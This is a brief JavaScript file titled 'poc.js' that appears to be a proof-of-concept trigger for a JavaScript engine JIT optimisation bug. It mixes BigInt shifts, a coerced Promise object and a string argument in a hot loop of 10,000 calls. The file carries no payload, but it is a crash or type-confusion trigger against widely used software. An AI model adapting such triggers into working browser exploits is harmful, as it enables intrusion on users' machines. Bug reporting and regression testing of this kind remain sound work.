// poc.js
function opt() {
function aux(a, b) {
if (b) {
b >> a;
} else {
let c = 0;
while (c < 7) {
c++;
}
}
}
let p = Promise;
++p;
aux(1n, 1n);
aux(1n, p);
return aux("number", p);
}

for (let i = 0; i < 10000; i++) {
opt();
}
opt();